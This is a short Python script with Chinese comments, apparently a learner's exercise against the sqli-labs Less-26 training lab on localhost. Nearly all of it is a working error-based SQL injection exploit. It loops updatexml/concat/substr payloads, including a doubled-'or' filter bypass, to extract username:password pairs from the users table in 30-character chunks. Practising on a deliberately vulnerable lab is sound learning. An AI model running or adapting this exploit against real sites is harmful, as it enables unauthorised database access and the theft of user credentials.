# """
# 实验 1：验证「发请求 → 拿到响应」这条管道

# 对应 EXP-5.py 里想写的四件事：
#   1. 引入发请求的库          → import requests
#   2. 定义 URL 和 payload     → URL / Payload
#   3. 把两者拼起来发出去       → requests.get(URL + Payload)
#   4. 看服务器返回了什么       → print(r.text[:500])

# 注意：Python 的注释是 #，不是 //
# """

import requests
import re

URL = "http://127.0.0.1/sqli-labs-master/Less-26/"
c = 0
result = ""

while True:
    # 每次只改起始位置：1 + c*30；长度固定 30
    Payload = ("?id=1'||updatexml(1,concat(0x7e,"
               "substr((select(group_concat(concat_ws(':',username,passwoorrd)))from(users)),"
               f"{1 + c*30},30),"
               "0x7e),3)||'")

    a = requests.get(URL + Payload)
    b2 = re.search(r"error:\s*'~(.*?)~'", a.text)

    if not b2 or not b2.group(1):    # 匹配不到 或 两个 ~ 中间是空的 → 取完了
        break

    chunk = b2.group(1)

    result += chunk

    c = c + 1

print("\n===== 完整结果 =====")
print(result)
print(f"\n长度 {len(result)} | 冒号 {result.count(':')} | 逗号 {result.count(',')}")
